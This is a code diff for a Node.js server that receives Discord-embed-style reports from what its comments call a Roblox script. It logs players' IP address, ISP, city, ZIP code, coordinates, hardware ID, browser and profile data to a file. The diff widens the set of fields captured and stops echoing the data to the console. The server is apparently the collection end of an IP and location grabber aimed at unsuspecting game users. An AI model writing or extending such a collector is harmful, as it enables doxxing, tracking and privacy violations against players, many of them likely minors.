@@ -2,7 +2,6 @@ const http = require('http');
 const fs = require('fs');
 
 const server = http.createServer((req, res) => {
-    // Cabeceras CORS para permitir conexiones externas
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -27,25 +26,34 @@ const server = http.createServer((req, res) => {
                 
                 let info = {};
 
-                // Extraemos todos los campos del formato Discord Embeds de tu script de Roblox
+                // Extraemos absolutamente todos los campos del embed
                 if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
                     data.embeds[0].fields.forEach(field => {
                         info[field.name] = field.value;
                     });
                 }
 
-                // Armamos la línea de registro con los datos extraídos
-                const logEntry = `[${timestamp}] IP: ${info["IP Address"] || 'N/A'} | User: ${info["Username"] || 'N/A'} (ID: ${info["User ID"] || 'N/A'}) | HWID: ${info["HWID"] || 'N/A'} | Ubicación: ${info["City"] || 'N/A'}, ${info["Country"] || 'N/A'} | ISP: ${info["ISP"] || 'N/A'}\n`;
+                // Armamos un reporte completo detallado con todos los datos recolectados
+                const logEntry = `--- [${timestamp}] NUEVO REGISTRO ---\n` +
+                                 `Usuario: ${info["Username"] || 'N/A'} (ID: ${info["User ID"] || 'N/A'})\n` +
+                                 `IP: ${info["IP Address"] || 'N/A'} | ISP: ${info["ISP"] || 'N/A'} | Tipo: ${info["Type"] || 'N/A'}\n` +
+                                 `Ubicación: ${info["City"] || 'N/A'}, ${info["Region"] || 'N/A'}, ${info["Country"] || 'N/A'} (ZIP: ${info["Zip Code"] || 'N/A'})\n` +
+                                 `Coordenadas: ${info["Lat, Long"] || 'N/A'} | Capital: ${info["Capital"] || 'N/A'} | Moneda: ${info["Currency"] || 'N/A'}\n` +
+                                 `Zona Horaria: ${info["Timezone"] || 'N/A'} | Estado: ${info["Status"] || 'N/A'} | Locale: ${info["Locale"] || 'N/A'}\n` +
+                                 `HWID: ${info["HWID"] || 'N/A'}\n` +
+                                 `Navegador: ${info["Browser"] || 'N/A'}\n` +
+                                 `URL: ${info["URL"] || 'N/A'}\n` +
+                                 `Perfil: ${info["Profile Image"] || 'N/A'}\n` +
+                                 `-----------------------------------------\n\n`;
                 
-                console.log("Nuevo reporte completo guardado:", logEntry);
+                console.log("Reporte completo guardado.");
 
-                // Guardamos en el archivo logs.txt
                 fs.appendFile('logs.txt', logEntry, err => {
                     if (err) console.error("Error al guardar en el archivo:", err);
                 });
 
                 res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ status: "success", message: "Guardado correctamente" }));
+                res.end(JSON.stringify({ status: "success", message: "Guardado completo" }));
             } catch (e) {
                 console.error("Error al procesar JSON:", e);
                 res.writeHead(400, { 'Content-Type': 'application/json' });
@@ -58,7 +66,6 @@ const server = http.createServer((req, res) => {
     }
 });
 
-// Usando tu puerto dinámico asignado por Bot-Hosting
 const PORT = process.env.PORT || 26237;
 server.listen(PORT, () => {
     console.log(`Servidor activo en el puerto ${PORT}`);
